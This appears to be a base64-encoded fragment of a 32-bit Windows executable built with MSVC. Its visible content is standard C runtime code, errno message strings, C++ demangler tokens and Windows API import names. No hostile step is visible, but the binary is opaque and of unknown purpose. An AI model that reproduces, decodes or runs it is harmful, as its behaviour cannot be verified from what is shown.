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BidXN5AGRpcmVjdG9yeSBub3QgZW1wdHkAZXhlY3V0YWJsZSBmb3JtYXQgZXJyb3IAZmlsZSBleGlzdHMAZmlsZSB0b28gbGFyZ2UAAGZpbGVuYW1lIHRvbyBsb25nAAAAZnVuY3Rpb24gbm90IHN1cHBvcnRlZAAAaG9zdCB1bnJlYWNoYWJsZQAAAABpZGVudGlmaWVyIHJlbW92ZWQAAGlsbGVnYWwgYnl0ZSBzZXF1ZW5jZQAAAGluYXBwcm9wcmlhdGUgaW8gY29udHJvbCBvcGVyYXRpb24AAGludGVycnVwdGVkAGludmFsaWQgYXJndW1lbnQAAAAAaW52YWxpZCBzZWVrAAAAAGlvIGVycm9yAAAAAGlzIGEgZGlyZWN0b3J5AABtZXNzYWdlIHNpemUAAAAAbmV0d29yayBkb3duAAAAAG5ldHdvcmsgcmVzZXQAAABuZXR3b3JrIHVucmVhY2hhYmxlAG5vIGJ1ZmZlciBzcGFjZQBubyBjaGlsZCBwcm9jZXNzAAAAAG5vIGxpbmsAbm8gbG9jayBhdmFpbGFibGUAAABubyBtZXNzYWdlIGF2YWlsYWJsZQAAAABubyBtZXNzYWdlAABubyBwcm90b2NvbCBvcHRpb24AAG5vIHNwYWNlIG9uIGRldmljZQAAbm8gc3RyZWFtIHJlc291cmNlcwBubyBzdWNoIGRldmljZSBvciBhZGRyZXNzAAAAbm8gc3VjaCBkZXZpY2UAAG5vIHN1Y2ggZmlsZSBvciBkaXJlY3RvcnkAAABubyBzdWNoIHByb2Nlc3MAbm90IGEgZGlyZWN0b3J5AG5vdCBhIHNvY2tldAAAAABub3QgYSBzdHJlYW0AAAAAbm90IGNvbm5lY3RlZAAAAG5vdCBlbm91Z2ggbWVtb3J5AAAAbm90IHN1cHBvcnRlZAAAAG9wZXJhdGlvbiBjYW5jZWxlZAAAb3BlcmF0aW9uIGluIHByb2dyZXNzAAAAb3BlcmF0aW9uIG5vdCBwZXJtaXR0ZWQAb3BlcmF0aW9uIG5vdCBzdXBwb3J0ZWQAb3BlcmF0aW9uIHdvdWxkIGJsb2NrAAAAb3duZXIgZGVhZAAAcGVybWlzc2lvbiBkZW5pZWQAAABwcm90b2NvbCBlcnJvcgAAcHJvdG9jb2wgbm90IHN1cHBvcnRlZA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AAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYHZpcnR1YWwgZGlzcGxhY2VtZW50IG1hcCcAAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAABgdWR0IHJldHVybmluZycAYEVIAGBSVFRJAAAAYGxvY2FsIHZmdGFibGUnAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnACBuZXdbXQAAIGRlbGV0ZVtdAAAAYG9tbmkgY2FsbHNpZycAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBlaCB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAGBkeW5hbWljIGF0ZXhpdCBkZXN0cnVjdG9yIGZvciAnAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAYG1hbmFnZWQgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgbG9jYWwgc3RhdGljIHRocmVhZCBndWFyZCcAb3BlcmF0b3IgIiIgAAAAAG9wZXJhdG9yIGNvX2F3YWl0AAAAb3BlcmF0b3I8PT4AIFR5cGUgRGVzY3JpcHRvcicAAAAgQmFzZSBDbGFzcyBEZXNjcmlwdG9yIGF0ICgAIEJhc2UgQ2xhc3MgQXJyYXknAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAABgYW5vbnltb3VzIG5hbWVzcGFjZScAAACcmEEA2JhBABSZQQBhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAGYAaQBiAGUAcgBzAC0AbAAxAC0AMQAtADEAAABhAHAAaQAtAG0AcwAtAHcAaQBuAC0AYwBvAHIAZQAtAHMAeQBuAGMAaAAtAGwAMQAtADIALQAwAAAAAABrAGUAcgBuAGUAbAAzADIAAAAAAGEAcABpAC0AbQBzAC0AAAAAAAAAAgAAAEZsc0FsbG9jAAAAAAAAAAACAAAARmxzRnJlZQAAAAAAAgAAAEZsc0dldFZhbHVlAAAAAAACAAAARmxzU2V0VmFsdWUAAQAAAAIAAABJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uRXgAbQBzAGMAbwByAGUAZQAuAGQAbABsAAAAQ29yRXhpdFByb2Nlc3MAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAABgAAAAAAAAAAAAAAAAAAAAYAAAAAAAAAAgAAAAEAAAAAAAAAAAAAAAQAAAAEAAAABQAAAAQAAAAFAAAABAAAAAUAAAAAAAAABQAAAAAAAAAFAAAAAAAAAAUAAAAAAAAABQAAAAAAAAAFAAAAAwAAAAUAAAADAAAAAAAAAAAAAAAAAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAIAAAAAgAAAAAAAAADAAAACAAAAAUAAAAAAAAABQAAAAgAAAAAAAAABwAAAAAAAAAIAAAAAAAAAAAAAAADAAAABwAAAAMAAAAAAAAAAwAAAAAAAAAFAAAABwAAAAUAAAAAAAAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAAAAAAIAAAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAYAAAAAAAAABgAAAAgAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAAACAAAAAcAAAAAAAAABwAAAAgAAAAHAAAACAAAAAcAAAAIAAAABwAAAAgAAAAAAAAACAAAAAAAAAAHAAAAAAAAAAgAAAAAAAAABwAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAHAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAgAAAAAAAAACAAAAAAAAAAIAAAABgAAAAgAAAAAAAAACAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAADAAAACAAAAAYAAAAIAAAAAAAAAAgAAAAGAAAACAAAAAIAAAAIAAAAAAAAAAEAAAAEAAAAAAAAAAUAAAAAAAAABQAAAAQAAAAFAAAABAAAAAUAAAAEAAAABQAAAAgAAAAFAAAACAAAAAUAAAAIAAAABQAAAAAAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAUAAAAAAAAACAAAAAAAAAAIAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAIAAAAIAAAAAgAAAAcAAAADAAAACAAAAAUAAAAAAAAABQAAAAcAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAAAAAAMAAAAHAAAAAwAAAAAAAAADAAA